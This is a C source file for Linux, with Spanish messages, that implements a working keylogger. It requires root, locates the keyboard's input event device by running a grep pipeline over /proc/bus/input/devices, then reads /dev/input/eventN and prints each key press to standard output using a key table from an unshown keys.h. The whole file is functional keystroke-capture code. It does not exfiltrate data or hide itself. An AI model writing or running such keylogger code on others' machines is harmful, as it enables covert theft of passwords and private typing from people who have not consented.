#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

char *getEvent();
#include "keys.h"

int main(int argc, char **argv)
{
    if (geteuid() != 0) {
        fprintf(stderr, "Error: Debes ejecutar el programa como root.\n");
        exit(1);
    }

    static char dir_event[20] = "/dev/input/";
    strncat(dir_event, getEvent(), sizeof(dir_event) - strlen(dir_event) - 1);

    struct input_event event;
    int fd = open(dir_event, O_RDONLY);
    if (fd == -1) {
        perror("Error al abrir el dispositivo de entrada");
        exit(2);
    }

    while (read(fd, &event, sizeof(event)) > 0) {
        if (event.type == EV_KEY && event.value == 1 && event.code >= 0 && event.code < 112) {
            printf("%s", keys[event.code]);
            fflush(stdout);
        }
    }

    close(fd);
    return 0;
}

char *getEvent()
{
    char *comando = (char *)
    "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -E -B1 120013 | grep -E -o event[0-9]";
    static char event[8];
    FILE *pipe = popen(comando, "r");
    if (!pipe) {
        perror("Error al ejecutar el comando");
        exit(1);
    }

    if (fgets(event, sizeof(event), pipe) == NULL) {
        fprintf(stderr, "Error: No se pudo encontrar un evento adecuado.\n");
        exit(1);
    }

    pclose(pipe);
    event[strlen(event) - 1] = 0x0;
    return event;
}
